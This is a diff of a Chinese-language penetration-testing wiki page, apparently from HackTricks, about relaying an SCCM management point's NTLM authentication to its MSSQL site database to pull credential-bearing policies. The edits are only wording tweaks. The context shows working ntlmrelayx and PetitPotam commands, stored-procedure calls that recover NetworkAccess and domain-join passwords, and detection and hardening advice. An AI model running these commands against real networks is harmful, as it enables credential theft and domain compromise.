@@ -13,7 +13,7 @@
 5. 执行：
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   （或 `MP_GetPolicyBodyAfterAuthorization`）
+* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (或 `MP_GetPolicyBodyAfterAuthorization`)
 6. 去除 `0xFFFE` BOM，`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。
 
 诸如 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等秘密在不接触 PXE 或客户端的情况下被恢复。
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-当强制执行触发时，您应该看到类似以下内容：
+当强制执行触发时，您应该看到类似于：
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -77,7 +77,7 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 * **CollectionSettings** – 可以包含以运行身份的账户
 
 ### 3.3  检索完整主体
-如果您已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方法跳过 clientID 要求：
+如果您已经拥有 `PolicyID` 和 `PolicyVersion`，则可以使用以下方法跳过 clientID 要求：
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
@@ -103,7 +103,7 @@ NetworkAccessPassword: P4ssw0rd123
 ---
 
 ## 5. 相关的 SQL 角色和过程
-在中继时，登录被映射到：
+在中继时，登录映射到：
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
@@ -127,7 +127,7 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 6. 检测与加固
-1. **监控 MP 登录** – 任何 MP 计算机账户从非主机 IP 登录 ≈ 中继。
+1. **监控 MP 登录** – 任何 MP 计算机账户从非其主机的 IP 登录 ≈ 中继。
 2. 在站点数据库上启用 **身份验证的扩展保护 (EPA)** (`PREVENT-14`)。
 3. 禁用未使用的 NTLM，强制 SMB 签名，限制 RPC（对 `PetitPotam`/`PrinterBug` 使用相同的缓解措施）。
 4. 使用 IPSec / 互相 TLS 加固 MP ↔ DB 通信。
@@ -135,12 +135,14 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 另请参见
-* NTLM 中继基础：
+* NTLM 中继基础知识：
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * MSSQL 滥用与后期利用：
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
